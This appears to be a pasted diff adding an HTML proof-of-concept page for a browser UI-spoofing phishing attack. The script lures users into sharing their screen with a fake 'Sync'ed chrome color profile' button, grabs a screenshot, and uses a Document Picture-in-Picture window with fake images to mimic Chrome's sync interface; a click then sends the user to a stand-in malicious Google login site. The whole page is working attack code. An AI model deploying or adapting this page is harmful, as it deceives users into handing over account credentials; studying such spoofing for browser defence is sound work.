@@ -1,0 +1,78 @@
+
+Save New Duplicate & Edit Just Text Twitter
+<html>
+<head>
+<body style="background-color:rgb(84, 84, 84)">
+<center>
+<button id="atk"> Take a screenshot to generate a Sync'ed chrome color profile! </button>
+</center>
+<script>
+
+const takeScreenShot = async () => {
+  const stream = await navigator.mediaDevices.getDisplayMedia({
+    video: { mediaSource: 'screen' },
+  })
+  // get correct video track
+  const track = stream.getVideoTracks()[0]
+  // init Image Capture and not Video stream
+  const imageCapture = new ImageCapture(track)
+  // take first frame only
+  const bitmap = await imageCapture.grabFrame()
+  // destory video track to prevent more recording / mem leak
+  track.stop()
+
+  const canvas = document.createElement('canvas') 
+  // this could be a document.createElement('canvas') if you want
+  // draw weird image type to canvas so we can get a useful image
+  canvas.width = bitmap.width;
+  canvas.height = bitmap.height;
+  const context = canvas.getContext('2d');
+  context.drawImage(bitmap, 0, 0, bitmap.width, bitmap.height);
+  const image = canvas.toDataURL();
+
+  return canvas;
+}
+
+document.getElementById("atk").addEventListener("click", e => {
+  takeScreenShot().then(sselem => {
+    navigator.documentPictureInPicture.requestWindow({
+      width: 700,
+      initialAspectRatio: 0.35,
+    }).then(pip => {
+      //const img = pip.window.document.createElement('img');
+      sselem.src = "pipattack.png";
+      sselem.style.position = "fixed";
+      sselem.style.top = "-31px";
+      sselem.style.left = `-${sselem.width - 377}px`;
+      pip.window.document.body.appendChild(sselem);
+
+      const fakebody = pip.window.document.createElement('div');
+      fakebody.style.position = "fixed";
+      fakebody.style.width = "100%";
+      fakebody.style.height = "calc(100% - 50px)";
+      fakebody.style.top = "39px";
+      fakebody.style.left = "0";
+      fakebody.style.height = "110%";
+      fakebody.style.borderTop = "1px solid rgb(219, 220, 221)";
+      fakebody.style.backgroundColor = "rgb(84, 84, 84)";
+      pip.window.document.body.appendChild(fakebody);
+
+      const fakesync = pip.window.document.createElement('img');
+      fakesync.src = "fakesync.png";
+      fakesync.style.position = "fixed";
+      fakesync.style.top = "34px";
+      fakesync.style.left = "46px";
+      pip.window.document.body.appendChild(fakesync);
+
+
+      pip.window.document.body.addEventListener("click", cl => {
+        pip.window.close();
+        window.location.href = 'https://example-malicious-google-login.com';
+      });
+    });
+  });
+  
+});
+</script>
+</body>
+</html>
